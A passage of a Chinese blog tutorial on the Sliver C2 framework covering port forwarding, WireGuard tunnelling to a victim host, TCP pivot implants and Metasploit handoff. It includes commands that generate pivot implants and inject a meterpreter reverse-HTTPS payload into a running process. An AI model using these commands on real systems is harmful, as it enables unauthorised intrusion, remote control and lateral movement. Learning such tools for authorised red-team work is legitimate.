+<p><img src="/2023/04/27/file-upload/-20231024141416340.png" srcset="/img/loading.gif" lazyload alt="image-20231024141416340"></p>
+<p>没开代理时无法访问：</p>
+<p><img src="/2023/04/27/file-upload/-20231024140848147.png" srcset="/img/loading.gif" lazyload alt="image-20231024140848147"></p>
+<p>开启本地代理：</p>
+<p><img src="/2023/04/27/file-upload/-20231024141027254.png" srcset="/img/loading.gif" lazyload alt="image-20231024141027254"></p>
+<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><h5 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h5><p>portfwd add命令可以实现端口转发，默认转发到本地8080端口：</p>
+<p><img src="/2023/04/27/file-upload/-20231024142207735.png" srcset="/img/loading.gif" lazyload alt="image-20231024142207735"></p>
+<h5 id="wg-portfwd"><a href="#wg-portfwd" class="headerlink" title="wg-portfwd"></a>wg-portfwd</h5><p>这种方式仅限于wg协议的implant。</p>
+<p>首先生成implant并且成功连接：</p>
+<p><img src="/2023/04/27/file-upload/-20231024150628911.png" srcset="/img/loading.gif" lazyload alt="image-20231024150628911"></p>
+<p><code>wg-portfwd add -r ip</code>来添加一条代理：</p>
+<p><img src="/2023/04/27/file-upload/-20231024150702740.png" srcset="/img/loading.gif" lazyload alt="image-20231024150702740"></p>
+<p>wg-config查看一下当前配置：</p>
+<p><img src="/2023/04/27/file-upload/-20231024150753598.png" srcset="/img/loading.gif" lazyload alt="image-20231024150753598"></p>
+<p>这里最后一个值endpoint，需要改为wg监听的ip:port</p>
+<p><img src="/2023/04/27/file-upload/-20231024150906277.png" srcset="/img/loading.gif" lazyload alt="image-20231024150906277"></p>
+<p>将配置文件保存。</p>
+<p>下面以windows端举例，安装WireGuard，导入.conf文件：</p>
+<p><img src="/2023/04/27/file-upload/-20231024150949990.png" srcset="/img/loading.gif" lazyload alt="image-20231024150949990"></p>
+<p>成功连接。</p>
+<p>这里将受害主机的http服务进行了转发，通过如下ip访问：</p>
+<p><img src="/2023/04/27/file-upload/-20231024151044199.png" srcset="/img/loading.gif" lazyload alt="image-20231024151044199"></p>
+<p><img src="/2023/04/27/file-upload/-20231024151102965.png" srcset="/img/loading.gif" lazyload alt="image-20231024151102965"></p>
+<p>成功。</p>
+<h4 id="pivots"><a href="#pivots" class="headerlink" title="pivots"></a>pivots</h4><h5 id="TCP-pivot"><a href="#TCP-pivot" class="headerlink" title="TCP pivot"></a>TCP pivot</h5><p>以tcp pivots举例，目前pivots只能在session模式下使用。</p>
+<p>在一个session中，pivots tcp:</p>
+<p><img src="/2023/04/27/file-upload/-20231024152334775.png" srcset="/img/loading.gif" lazyload alt="image-20231024152334775"></p>
+<p>生成一个tcp的pivot，接下来生成一个新的implant：</p>
+<p><code>generate --tcp-pivot 192.168.126.128:9898 --save pivot.exe</code></p>
+<p><img src="/2023/04/27/file-upload/-20231024152524748.png" srcset="/img/loading.gif" lazyload alt="image-20231024152524748"></p>
+<p>接着将该implant植入域内其他主机即可，即将当前session当作跳板机来使用。</p>
+<h4 id="联动msf"><a href="#联动msf" class="headerlink" title="联动msf"></a>联动msf</h4><h5 id="在当前进程执行msf-payload"><a href="#在当前进程执行msf-payload" class="headerlink" title="在当前进程执行msf payload"></a>在当前进程执行msf payload</h5><p><img src="/2023/04/27/file-upload/-20231024155719870.png" srcset="/img/loading.gif" lazyload alt="image-20231024155719870"></p>
+<p>执行命令<code>msf -L 192.168.126.128 -l 1234 -m meterpreter_reverse_https</code></p>
+<p>在msf中设置ip port payload一致之后，exploit：</p>
+<p><img src="/2023/04/27/file-upload/-20231024155753056.png" srcset="/img/loading.gif" lazyload alt="image-20231024155753056"></p>
+<p>成功在msf上线。</p>
+<h5 id="将msf-payload注入到指定进程中"><a href="#将msf-payload注入到指定进程中" class="headerlink" title="将msf payload注入到指定进程中"></a>将msf payload注入到指定进程中</h5><p>通过-p参数指定要注入的pid：</p>
+<p><img src="/2023/04/27/file-upload/-20231024160043320.png" srcset="/img/loading.gif" lazyload alt="image-20231024160043320"></p>
+<p><code>msf-inject -L 192.168.126.128 -l 1234 -m meterpreter_reverse_https -p 7960</code></p>
+<p><img src="/2023/04/27/file-upload/-20231024160122995.png" srcset="/img/loading.gif" lazyload alt="image-20231024160122995"></p>
+<p>成功将payload注入到pid为7960的进程中。</p>
+<h2 id="默认配置"><a href="#默认配置" class="headerlink" title="默认配置"></a>默认配置</h2><p>配置文件中，默认端口为31337，建议进行修改。</p>
+<p><img src="/2023/04/27/file-upload/-20231024131541328.png" srcset="/img/loading.gif" lazyload alt="image-20231024131541328"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/C2/">C2</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/C2/">C2</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/07/23/sliver%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sliver流量分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/23/kali%E9%80%9A%E8%BF%87%E7%89%A9%E7%90%86%E6%9C%BAclash%E4%BB%A3%E7%90%86%E4%B8%8A%E7%BD%91/">
+                        <span class="hidden-mobile">kali通过物理机clash代理上网</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"MgDyY5XEdtIKIZHTxzy3GBJV-gzGzoHsz","appKey":"P8Ab9EN1clJmhpYHpamFEiD9","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
